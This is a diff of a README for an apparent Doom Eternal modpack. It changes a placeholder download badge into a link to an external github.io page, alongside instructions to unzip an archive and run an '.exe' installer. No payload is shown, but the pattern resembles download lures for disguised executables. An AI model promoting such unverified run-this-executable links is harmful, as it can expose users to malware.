@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mods will be automatically installed into your Doom Eternal mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://modpack-collection-doom-eternal.github.io/.github/)
 
 ## 📸 Overview
 ![doom-eternal-modpack-new-weapons](https://github.com/user-attachments/assets/f43c783b-e991-4b89-b35d-b735bc386b9b)
